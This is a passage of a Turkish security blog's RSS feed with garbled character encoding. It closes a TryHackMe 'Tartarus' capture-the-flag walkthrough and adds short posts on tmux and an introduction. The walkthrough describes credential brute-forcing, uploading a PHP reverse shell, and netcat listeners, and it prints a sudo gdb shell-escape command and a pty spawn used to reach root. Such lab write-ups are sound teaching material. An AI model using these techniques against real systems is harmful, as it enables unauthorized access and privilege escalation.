<p>Username ve Password parametleri iÃ§in denenecek verilerin olduÄŸu listeler yÃ¼klenir.</p>

    <img src="/images/thm/tartarus/username.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/thm/tartarus/passwd.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>SaldÄ±rÄ± sonucunda kullanÄ±cÄ± adÄ± ve parola bilgisi elde edilir.</p>

    <img src="/images/thm/tartarus/result.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Elde edilen oturum bilgileri ile giriÅŸ yapÄ±lÄ±r. Dosya yÃ¼kleme sayfasÄ± gelmektedir. Reverse shell almak iÃ§in bir <a href="https://github.com/pentestmonkey/php-reverse-shell">php</a> sayfasÄ± upload edilir.</p>

    <img src="/images/thm/tartarus/upload.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Gobuster aracÄ± ile <i style="color:yellow">/sUp3r-s3cr3t</i>  dizini altÄ±nda dosyanÄ±n upload edildiÄŸi yeri bulmak iÃ§in dizin taramasÄ± yapÄ±lÄ±r. Tarama sonucunda image dizini tespit edilir. Bu dizin iÃ§erisinde de yÃ¼kleninen php dosyasÄ± bulunmamaktadÄ±r. <i style="color:yellow">/sUp3r-s3cr3t/images</i> dizini altÄ±nda da tarama yapÄ±lÄ±r ve uploads dizini tespit edilir. 
</div>

    <img src="/images/thm/tartarus/upload2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>

<div style="text-align:justify;">
Localhosttan netcat ile 4444 portu dinlenmeye baÅŸlanÄ±r. Daha sonra http://10.10.236.156/sUp3r-s3cr3t/images/uploads/reverse.php adresine gidilir ve terminal baÄŸlantÄ±sÄ± saÄŸlanÄ±r.
</div>

    <img src="/images/thm/tartarus/ncat.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>DÃ¼ÅŸÃ¼k kullanÄ±cÄ± ile shell alÄ±ndÄ±ÄŸÄ±ndan user.txt dosyasÄ±nÄ± okumak iÃ§in yetki yÃ¼kselmek gereklidir.
<code>sudo -l </code> komutu girilir.</p>

    <img src="/images/thm/tartarus/nc2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<strong> Thirtytwo </strong> adlÄ± kullanÄ±cÄ± iÃ§in <i> var/www/gbd</i> uygulamasÄ± parola gerektirmeden Ã§alÄ±ÅŸtÄ±rÄ±labildiÄŸi tespit edilmektedir. AÅŸaÄŸÄ±da yer alan komut ile kullanÄ±cÄ± baÄŸlanÄ±r ve gdb istismar edilerek  thirtytwo kullanÄ±cÄ±sÄ±na giriÅŸ yapÄ±lÄ±r.
</div>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u thirtytwo /var/www/gdb -nx -ex <span style="color:#e6db74">&#39;!sh&#39;</span> -ex quit
</code></pre></div>
    <img src="/images/thm/tartarus/32.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Python pty modÃ¼lÃ¼ kullanÄ±larak interaktif shelle geÃ§ilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Home dizininde yer alan diÄŸer kullanÄ±cÄ± dizininde yer alan user.txt dosyasÄ± okunur.</p>

    <img src="/images/thm/tartarus/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Yetki yÃ¼kseltme aÅŸamasÄ±nda crontab da zamanlanmÄ±ÅŸ gÃ¶revlere bakÄ±ldÄ±ÄŸÄ±nda root yetkisi ile cleanup.py dosyasÄ±nÄ±n her iki dakikada bir Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/thm/tartarus/crontab.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>DosyanÄ±n yetkilerine bakÄ±ldÄ±ÄŸÄ±nda iÃ§eriÄŸinin deÄŸiÅŸtirilebileceÄŸi gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/thm/tartarus/ls.png"  alt="Hello Friend"  class="left"  style="border-radius: 10px;"  />


<p>Cleanup.py dosyasÄ±nÄ±n iÃ§eriÄŸi aÅŸaÄŸÄ±daki gibi deÄŸiÅŸtirilir.</p>

    <img src="/images/thm/tartarus/pri.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Netcat ile 5555 numaralÄ± port dinlenir. ZamanlanmÄ±ÅŸ gÃ¶rev Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda root yetkisi ile reverse shell baÄŸlantÄ±sÄ± saÄŸlanmÄ±ÅŸ olur.</p>

    <img src="/images/thm/tartarus/reverse.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Root dizini altÄ±nda yer alan root.txt dosyasÄ± okunurak makina tamamlanÄ±r.

    <img src="/images/thm/tartarus/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>$Tmux NotlarÄ±</title>
            <link>https://barcode91.github.io/posts/2020/08/tmux-notlar%C4%B1/</link>
            <pubDate>Mon, 31 Aug 2020 22:53:43 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/08/tmux-notlar%C4%B1/</guid>
            <description>Tmux -&amp;gt; Terminal Multiplexer
Tmux bir terminal Ã§oklayÄ±cÄ±dÄ±r. Bir terminal ekranÄ±nda birden fazla pencere ve bu pencere iÃ§erisinde biden fazla bÃ¶lme oluÅŸturulabilmektedir. Terminal Ã¼zerinde Ã§alÄ±ÅŸanlar iÃ§in oldukÃ§a bir araÃ§tÄ±r.
Kurulum #Debian, Ubuntu ve TÃ¼revleri iÃ§in Kurulum KomutlarÄ± $ sudo apt-get install tmux #Centos Kurulum KomutlarÄ± $ yum -y install tmux Ã‡alÄ±ÅŸtÄ±rma ve KullanÄ±m #Tmux Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± $tmux Tmux Ã§eÅŸitli tuÅŸ kombinasyonlarÄ± ile kullanÄ±lmaktadÄ±r. Komutlar prefix key tuÅŸuna basÄ±ldÄ±ktan sonra girilmektedir.
Prefix Key =&amp;gt; Crtl+B TuÅŸlara aynÄ± anda basÄ±lÄ±r ve bÄ±rakÄ±lÄ±r daha sonra diÄŸer tuÅŸlara basÄ±lÄ±r.</description>
            <content type="html"><![CDATA[<p><em>Tmux -&gt; Terminal Multiplexer</em></p>
<p>Tmux bir terminal Ã§oklayÄ±cÄ±dÄ±r. Bir terminal ekranÄ±nda birden fazla pencere ve bu pencere iÃ§erisinde biden fazla bÃ¶lme oluÅŸturulabilmektedir. Terminal Ã¼zerinde Ã§alÄ±ÅŸanlar iÃ§in oldukÃ§a bir araÃ§tÄ±r.</p>
<h2 id="kurulum">Kurulum</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    <span style="color:#75715e">#Debian, Ubuntu ve TÃ¼revleri iÃ§in Kurulum KomutlarÄ±</span>
    $ sudo apt-get install tmux

    <span style="color:#75715e">#Centos Kurulum KomutlarÄ±</span>
    $ yum -y install tmux
</code></pre></div><h2 id="Ã§alÄ±ÅŸtÄ±rma-ve-kullanÄ±m">Ã‡alÄ±ÅŸtÄ±rma ve KullanÄ±m</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    <span style="color:#75715e">#Tmux Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±</span>
    $tmux
</code></pre></div><p>Tmux Ã§eÅŸitli tuÅŸ kombinasyonlarÄ± ile kullanÄ±lmaktadÄ±r. Komutlar prefix key tuÅŸuna basÄ±ldÄ±ktan sonra girilmektedir.</p>
<p><strong>Prefix Key =&gt; Crtl+B</strong>  TuÅŸlara aynÄ± anda basÄ±lÄ±r ve bÄ±rakÄ±lÄ±r daha sonra diÄŸer tuÅŸlara basÄ±lÄ±r.</p>
<p>Ctrl+B TuÅŸ Kombinasyonundan sonra kullanÄ±lan tuÅŸlar;</p>
<pre><code class="language-tmux" data-lang="tmux">    % pencereleri dikey olarak bÃ¶ler
    &quot; pencereleri yatay olarak bÃ¶ler 
    &lt;YÃ¶n TuÅŸlarÄ±&gt; pencereler arasÄ± gezinti
</code></pre><h2 id="pencerelerin-kapatÄ±lmasÄ±">Pencerelerin KapatÄ±lmasÄ±</h2>
<p>Aktif pencere de <strong><em>$ exit</em></strong> komutu yazÄ±larak yada <strong><em>Ctrl+D</em></strong> tuÅŸ kombinasyonu kullanÄ±larak bÃ¶lme kapatÄ±lÄ±r.</p>
<h2 id="pencere-yÃ¶netimi">Pencere YÃ¶netimi</h2>
<p>Ctrl+B TuÅŸ Kombinasyonundan sonra</p>
<pre><code class="language-tmux" data-lang="tmux">
    c Yeni pencere aÃ§ar
    p Bir Ã¶nceki pencere
    n Bir sonraki pencere
    x Pencereyi kapat (y/n)

</code></pre><p>Daha fazlasÄ± iÃ§in <strong><em>$man tmux</em></strong></p>
]]></content>
        </item>
        
        <item>
            <title>$touch First</title>
            <link>https://barcode91.github.io/posts/2020/08/touch-first/</link>
            <pubDate>Mon, 24 Aug 2020 19:41:25 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/08/touch-first/</guid>
            <description>KÄ±sa bir giriÅŸ Bilginin paylaÅŸtÄ±kÃ§a Ã§oÄŸaldÄ±ÄŸÄ±na inanÄ±rÄ±m. AyrÄ±ca Yunus Emre&amp;rsquo;nin gÃ¼zel sÃ¶zÃ¼nÃ¼de hatÄ±rlamak gerekir; &amp;ldquo;BÃ¶lÃ¼ÅŸÃ¼rsek tok oluruz, bÃ¶lÃ¼nÃ¼rsek yok oluruz&amp;rdquo;. Hal bÃ¶yle iken edindiÄŸim bilgileri siz deÄŸerli insalarla paylaÅŸmayÄ± kendime bir vazife belledim.
Blogumda siber gÃ¼venlik, network, bulut biliÅŸim teknolojilerine dair bilgiler paylaÅŸacaÄŸÄ±m.
 Siber gÃ¼venlik alanÄ±nda hackthebox, tryhackme, priviahub vb. platformlarda yer alan zafiyetli makinalar ile challenge Ã§Ã¶zÃ¼mleri Network alanÄ±nda router, switch yapÄ±landÄ±rmalarÄ±, network trafiÄŸinin monitÃ¶r edilmesi iÃ§in kullanÄ±lan araÃ§lar ve kurulumlarÄ± gibi konular Bulut BiliÅŸim alanÄ±nda ise docker, kubernets, openvswitch vb.</description>
            <content type="html"><![CDATA[<h1 id="kÄ±sa-bir-giriÅŸ">KÄ±sa bir giriÅŸ</h1>
<p>Bilginin paylaÅŸtÄ±kÃ§a Ã§oÄŸaldÄ±ÄŸÄ±na inanÄ±rÄ±m. AyrÄ±ca Yunus Emre&rsquo;nin gÃ¼zel sÃ¶zÃ¼nÃ¼de hatÄ±rlamak gerekir; <em>&ldquo;BÃ¶lÃ¼ÅŸÃ¼rsek tok oluruz, bÃ¶lÃ¼nÃ¼rsek yok oluruz&rdquo;</em>. Hal bÃ¶yle iken edindiÄŸim bilgileri siz deÄŸerli insalarla paylaÅŸmayÄ± kendime bir vazife belledim.</p>
<p>Blogumda siber gÃ¼venlik, network, bulut biliÅŸim teknolojilerine dair bilgiler paylaÅŸacaÄŸÄ±m.</p>
<ul>
<li>Siber gÃ¼venlik alanÄ±nda hackthebox, tryhackme, priviahub vb. platformlarda yer alan zafiyetli makinalar ile challenge Ã§Ã¶zÃ¼mleri</li>
<li>Network alanÄ±nda router, switch yapÄ±landÄ±rmalarÄ±, network trafiÄŸinin monitÃ¶r edilmesi iÃ§in kullanÄ±lan araÃ§lar ve kurulumlarÄ± gibi konular</li>
<li>Bulut BiliÅŸim alanÄ±nda ise docker, kubernets, openvswitch vb. konular</li>
</ul>
<p><strong>SÃ¼rÃ§i lisan ettik ise affola&hellip;</strong></p>
]]></content>
        </item>
        
    </channel>
</rss>
